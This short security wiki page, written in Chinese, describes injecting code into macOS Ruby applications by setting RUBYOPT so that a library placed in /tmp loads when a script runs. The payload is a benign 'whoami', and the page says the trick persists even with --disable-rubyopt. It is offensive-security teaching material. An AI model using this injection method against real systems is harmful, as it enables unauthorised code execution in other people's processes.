# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

使用这个环境变量，可以在每次执行**ruby**时**添加新参数**。虽然参数**`-e`**不能用于指定要执行的ruby代码，但可以使用参数**`-I`**和**`-r`**来添加一个新文件夹到库加载路径，然后**指定要加载的库**。

在**`/tmp`**中创建库**`inject.rb`**：
```ruby:inject.rb
puts `whoami`
```
创建一个类似于以下的 Ruby 脚本：
```ruby:hello.rb
puts 'Hello, World!'
```
然后使用以下任意 Ruby 脚本加载它：
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
有趣的事实，即使使用参数 **`--disable-rubyopt`** 也有效：
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
